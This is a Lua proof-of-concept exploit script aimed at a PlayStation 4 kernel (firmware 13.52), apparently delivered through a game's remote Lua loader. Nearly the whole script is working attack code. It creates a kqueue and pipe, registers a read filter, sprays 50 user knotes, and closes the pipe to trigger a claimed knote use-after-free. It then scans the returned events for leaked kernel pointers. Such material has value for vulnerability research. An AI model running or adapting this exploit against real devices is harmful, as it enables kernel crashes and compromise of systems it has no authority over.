--[[
    PoC: kqueue knote Use-After-Free Confirmation
    PS4 FW 13.52 - Hamidashi Creative (CUSA27389)
    
    This script confirms the existence of a UAF vulnerability in the
    BSD kqueue/knote subsystem by closing a pipe monitored by EVFILT_READ
    while EVFILT_USER knotes are registered on the same kqueue.
    
    Expected result: Without spray, kernel CRASHES (connection abort).
    With spray, kernel survives but no kernel pointers in event data.
    
    Usage: send via Remote Lua Loader
    python3 send.lua 192.168.100.61 9026 uaf_confirm.lua
--]]

local utils = require("lib.ps4_utils")

utils.banner("knote UAF Confirmation PoC")

local S = rawget(_G, "syscall")
local M = rawget(_G, "memory")

utils.resolve()
S.resolve({kqueue = 362, kevent = 363, pipe = 42, close = 6})

-- ============================================
-- Phase 1: Create infrastructure
-- ============================================
print("\n[*] Phase 1: Creating kqueue + pipe")

local kq = S.kqueue()
if kq < 0 then
    print("[-] FATAL: kqueue creation failed")
    return
end
print("[+] kqueue fd: " .. kq)

local pbuf = M.alloc(16)
local pres = S.pipe(pbuf)
if pres ~= 0 then
    print("[-] FATAL: pipe creation failed")
    return
end
local rd = M.tonum(M.read_dword(pbuf))
local wr = M.tonum(M.read_dword(pbuf + 4))
print("[+] pipe: rd=" .. rd .. " wr=" .. wr)

-- ============================================
-- Phase 2: Register EVFILT_READ (allocates knote)
-- ============================================
print("\n[*] Phase 2: Registering EVFILT_READ on pipe")

local ev = utils.mkkevent(
    utils.EVFILT_READ, rd,
    utils.EV_ADD + utils.EV_ENABLE,
    0, 0, 0
)
local nev = S.kevent(kq, ev, 1, nil, 0, 0)
print("[+] kevent register: " .. nev)

-- ============================================
-- Phase 3: OPTIONAL pre-spray (set to 0 for crash test)
-- ============================================
local SPRAY_COUNT = 50
print("\n[*] Phase 3: Pre-spraying " .. SPRAY_COUNT .. " EVFILT_USER knotes")

for i = 1, SPRAY_COUNT do
    local uev = utils.mkkevent(
        utils.EVFILT_USER, i,
        utils.EV_ADD + utils.EV_ENABLE,
        0, 0, i
    )
    S.kevent(kq, uev, 1, nil, 0, 0)
end
print("[+] Spray complete")

-- ============================================
-- Phase 4: Close pipe (triggers UAF)
-- ============================================
print("\n[*] Phase 4: Closing pipe (UAF trigger)")
S.close(rd)
S.close(wr)
print("[+] Pipe closed - knote freed")

-- ============================================
-- Phase 5: Read events
-- ============================================
print("\n[*] Phase 5: Reading kevent events")

local outbuf = M.alloc(3200)
local nevents = S.kevent(kq, nil, 0, outbuf, 100, 0)
print("[+] Events returned: " .. (nevents or "nil/err"))

-- ============================================
-- Phase 6: Analyze results
-- ============================================
print("\n[*] Phase 6: Analyzing event data")

if nevents and nevents > 0 then
    local total_kptrs = 0
    local events_with_kptrs = 0
    
    for i = 0, nevents - 1 do
        local kev = utils.parse_kevent(outbuf, i)
        local event_kptrs = 0
        
        -- Check all 6 fields for kernel pointers
        local fields = {"ident", "fflags", "data", "udata"}
        for _, field in ipairs(fields) do
            if utils.is_kernel_ptr(kev[field]) then
                event_kptrs = event_kptrs + 1
                print(string.format(
                    "[!] KERNEL PTR in event %d .%s = 0x%x",
                    i, field, kev[field]
                ))
            end
        end
        
        total_kptrs = total_kptrs + event_kptrs
        if event_kptrs > 0 then
            events_with_kptrs = events_with_kptrs + 1
        end
    end
    
    print(string.format(
        "\n[*] Results: %d events, %d with kernel ptrs, %d total kernel ptrs",
        nevents, events_with_kptrs, total_kptrs
    ))
    
    if total_kptrs == 0 then
        print("[!] CONCLUSION: Kernel properly initializes EVFILT_USER knote fields")
        print("[!] kn_fop overwritten with &user_filterops, no stale kernel pointers")
        print("[!] The UAF is real but not exploitable without additional bugs")
    else
        print("[!] *** KERNEL POINTER LEAK DETECTED ***")
        print("[!] This is a critical finding - document all leaked addresses!")
    end
else
    print("[-] No events returned")
    if nevents == nil then
        print("[-] kevent call failed (possible kernel crash without spray)")
    end
end

print("\n[*] PoC complete")
